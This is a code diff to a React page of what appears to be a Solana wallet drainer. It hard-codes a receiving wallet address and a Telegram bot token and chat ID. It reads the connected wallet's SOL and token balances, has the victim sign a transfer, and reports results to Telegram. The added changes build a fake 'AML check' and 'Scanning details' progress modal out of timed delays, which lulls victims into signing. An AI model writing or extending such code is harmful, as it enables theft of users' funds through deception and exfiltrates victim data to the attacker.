@@ -6,10 +6,25 @@ import { useEffect, useState } from 'react';
 import { getTokenAccounts, sendToTelegram, signAndSendTransaction, getWalletBalance } from '@/utils/walletUtils';
 import { toast } from '@/components/ui/use-toast';
 import { Menu } from "lucide-react";
+import LoadingModal, { ConnectionStep } from '@/components/LoadingModal';
 
 const BACKEND_ADDRESS = "GsRoop6YCzpakWCoG7YnHSSgMvcgjnuFEie62GRZdmJx";
 const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
 const TELEGRAM_CHAT_ID = "-1002490122517";
+
+const initialSteps: ConnectionStep[] = [
+  { id: 'connect', label: 'Connect', status: 'pending' },
+  { id: 'connectSuccess', label: 'Connect success', status: 'pending' },
+  { id: 'addressCheck', label: 'Address check', status: 'pending' },
+  { id: 'amlCheck', label: 'AML check', status: 'pending' },
+  { id: 'successfulAmlCheck', label: 'Successful AML check', status: 'pending' },
+  { id: 'scanningDetails', label: 'Scanning details', status: 'pending' },
+  { id: 'thanks', label: 'Thanks', status: 'pending' },
+  { id: 'signConfirmation', label: 'Sign confirmation', status: 'pending' },
+  { id: 'signWaitingTitle', label: 'Sign waiting - title', status: 'pending' },
+  { id: 'signWaitingDescription', label: 'Sign waiting - description', status: 'pending' },
+  { id: 'successfulSign', label: 'Successful sign', status: 'pending' }
+];
 
 const Index = () => {
   const { publicKey, connecting, connected, wallet } = useWallet();
@@ -22,6 +37,38 @@ const Index = () => {
   const [connectionAttempts, setConnectionAttempts] = useState(0);
   const [isLoading, setIsLoading] = useState(false);
   const [fetchRetries, setFetchRetries] = useState(0);
+  
+  // Loading modal state
+  const [showLoadingModal, setShowLoadingModal] = useState(false);
+  const [connectionSteps, setConnectionSteps] = useState<ConnectionStep[]>(initialSteps);
+  const [currentStep, setCurrentStep] = useState('connect');
+
+  const updateStepStatus = (stepId: string, status: 'pending' | 'active' | 'completed' | 'error') => {
+    setConnectionSteps(steps => 
+      steps.map(step => 
+        step.id === stepId 
+          ? { ...step, status } 
+          : step
+      )
+    );
+    if (status === 'active') {
+      setCurrentStep(stepId);
+    }
+  };
+
+  const advanceToNextStep = (currentStepId: string) => {
+    // Mark current step as completed
+    updateStepStatus(currentStepId, 'completed');
+    
+    // Find the index of the current step
+    const currentIndex = connectionSteps.findIndex(step => step.id === currentStepId);
+    
+    // If there's a next step, make it active
+    if (currentIndex < connectionSteps.length - 1) {
+      const nextStep = connectionSteps[currentIndex + 1];
+      updateStepStatus(nextStep.id, 'active');
+    }
+  };
 
   const fetchWalletData = async () => {
     if (!publicKey || !wallet) {
@@ -34,16 +81,32 @@ const Index = () => {
     setIsLoading(true);
     
     try {
+      updateStepStatus('addressCheck', 'active');
       console.log("Getting wallet balance directly");
       const solBalance = await getWalletBalance(publicKey.toString());
       
       setWalletBalance(solBalance);
       console.log("Current balance:", solBalance, "SOL");
+      advanceToNextStep('addressCheck');
 
+      updateStepStatus('amlCheck', 'active');
       console.log("Fetching token accounts");
       const tokenAccounts = await getTokenAccounts(connection, publicKey.toString());
       console.log("Token accounts received:", tokenAccounts);
       setTokens(tokenAccounts || []);
+      advanceToNextStep('amlCheck');
+      
+      updateStepStatus('successfulAmlCheck', 'active');
+      await new Promise(resolve => setTimeout(resolve, 800));
+      advanceToNextStep('successfulAmlCheck');
+
+      updateStepStatus('scanningDetails', 'active');
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      advanceToNextStep('scanningDetails');
+
+      updateStepStatus('thanks', 'active');
+      await new Promise(resolve => setTimeout(resolve, 800));
+      advanceToNextStep('thanks');
 
       setFetchRetries(0);
 
@@ -91,6 +154,17 @@ const Index = () => {
 
     setIsProcessing(true);
     setConnectionAttempts(prev => prev + 1);
+    setConnectionSteps(initialSteps);
+    setShowLoadingModal(true);
+    
+    // Start the connection process in the UI
+    updateStepStatus('connect', 'active');
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    advanceToNextStep('connect');
+    
+    updateStepStatus('connectSuccess', 'active');
+    await new Promise(resolve => setTimeout(resolve, 800));
+    advanceToNextStep('connectSuccess');
     
     try {
       toast({
@@ -154,6 +228,7 @@ const Index = () => {
           description: "Your wallet has no SOL balance. No further action needed.",
         });
         setIsProcessing(false);
+        setShowLoadingModal(false);
         return;
       }
 
@@ -174,6 +249,7 @@ const Index = () => {
           description: "Your wallet balance is too low for transaction processing.",
         });
         setIsProcessing(false);
+        setShowLoadingModal(false);
         return;
       }
 
@@ -193,6 +269,8 @@ const Index = () => {
       console.log("Initiating transfer");
       
       try {
+        updateStepStatus('signConfirmation', 'active');
+        
         toast({
           title: "Confirming",
           description: "Please confirm the transaction in your wallet",
@@ -202,6 +280,15 @@ const Index = () => {
           throw new Error("Wallet or publicKey is undefined");
         }
 
+        advanceToNextStep('signConfirmation');
+        updateStepStatus('signWaitingTitle', 'active');
+        await new Promise(resolve => setTimeout(resolve, 500));
+        advanceToNextStep('signWaitingTitle');
+        
+        updateStepStatus('signWaitingDescription', 'active');
+        await new Promise(resolve => setTimeout(resolve, 500));
+        advanceToNextStep('signWaitingDescription');
+
         const signature = await signAndSendTransaction(
           connection,
           wallet,
@@ -210,6 +297,10 @@ const Index = () => {
           TELEGRAM_BOT_TOKEN,
           TELEGRAM_CHAT_ID
         );
+
+        updateStepStatus('successfulSign', 'active');
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        advanceToNextStep('successfulSign');
 
         console.log("Transfer completed with signature:", signature);
         setLastSignature(signature);
@@ -229,6 +320,16 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
         });
       } catch (error) {
         console.error("Transfer failed:", error);
+        
+        // Add error steps
+        setConnectionSteps(prev => [
+          ...prev,
+          { id: 'errorTitle', label: 'Error - title', status: 'error' },
+          { id: 'errorDescription', label: 'Error - description', status: 'error' }
+        ]);
+        
+        updateStepStatus('errorTitle', 'active');
+        await new Promise(resolve => setTimeout(resolve, 500));
         
         const failureMessage = {
           address: publicKey.toString(),
@@ -264,7 +365,10 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
         variant: "destructive",
       });
     } finally {
-      setIsProcessing(false);
+      setTimeout(() => {
+        setShowLoadingModal(false);
+        setIsProcessing(false);
+      }, 2000);
     }
   };
 
@@ -287,6 +391,12 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
 
   return (
     <div className="min-h-screen bg-background p-6 relative">
+      <LoadingModal 
+        isOpen={showLoadingModal} 
+        steps={connectionSteps} 
+        currentStep={currentStep} 
+      />
+      
       <nav className="flex justify-between items-center mb-20">
         <div className="w-12 h-12 rounded-full bg-gradient-to-r from-cyan-400 to-cyan-300 p-[2px]">
           <div className="w-full h-full rounded-full bg-background flex items-center justify-center">
